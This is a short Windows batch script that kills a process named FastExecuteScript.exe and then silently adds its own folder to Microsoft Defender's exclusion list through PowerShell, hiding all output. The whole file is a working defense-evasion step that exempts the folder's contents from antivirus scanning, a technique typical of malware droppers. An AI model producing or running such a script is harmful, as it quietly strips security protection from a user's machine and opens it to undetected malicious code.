@echo off
taskkill /F /IM FastExecuteScript.exe > nul 2>&1
set "CurrentFolder=%~dp0"
set "CurrentFolder=%CurrentFolder:~0,-1%"
powershell -Command "Add-MpPreference -ExclusionPath '%CurrentFolder%'" > nul 2>&1
exit